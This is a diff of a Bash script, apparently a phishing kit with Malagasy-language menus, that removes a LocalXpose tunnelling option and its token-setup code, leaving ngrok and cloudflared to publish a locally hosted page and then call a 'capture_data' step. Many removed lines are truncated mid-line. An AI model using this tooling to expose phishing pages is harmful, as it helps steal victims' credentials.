@@ -315,54 +315,8 @@ start_cloudflared() {
     echo -e "${RED}[${WHITE}-${RED}]${BLUE} Rohy (URL) : ${GREEN}${cldflr_link}"
     capture_data
 }
-## Start LocalXpose (Again...)
-start_loclx() {
-        cusport
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${>
-        { sleep 1; setup_site; localxpose_auth; }
-        echo -e "\n"
-        read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Se>
-        [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_regio>
-        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalX>
 
-        if [[ `command -v termux-chroot` ]]; then
-                sleep 1 && termux-chroot ./.server/loclx tunnel --raw>
-        else
-                sleep 1 && ./.server/loclx tunnel --raw-mode http --r>
-        fi
 
-        { sleep 12; clear; banner_small; }
-        loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx>
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}htt>
-        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$ma>
-        capture_data
-}
-localxpose_auth() {
-        ./.server/loclx -help > /dev/null 2>&1 &
-        sleep 1
-        [ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_>
-
-        [ "$(./.server/loclx account status | grep Error)" ] && {
-                echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create a>
-                sleep 3
-                read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx>
-                [[ $loclx_token == "" ]] && {
-                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} You >
-                } || {
-                        echo -n "$loclx_token" > $auth_f 2> /dev/null
-                }
-        }
-}
-
-## Start localhost
-start_localhost() {
-        cusport
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${>
-        setup_site
-        { sleep 1; clear; banner_small; }
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hoste>
-        capture_data
-}
 
 tunnel_menu() {
     clear; banner_small
@@ -377,7 +331,7 @@ EOF
         01) setup_site; capture_data ;;
         02) start_ngrok ;;
         03) start_cloudflared ;;
-        04) start_loclx ;;
+        
         *) echo -e "\n${RED}[${WHITE}!${RED}]${RED} Safidy tsy manan-kery.${WHITE}"; sleep 1; tunnel_menu ;;
     esac
 }
@@ -432,5 +386,4 @@ EOF
 kill_pid
 dependencies
 install_cloudflared
-install_loclx
 main_menu 
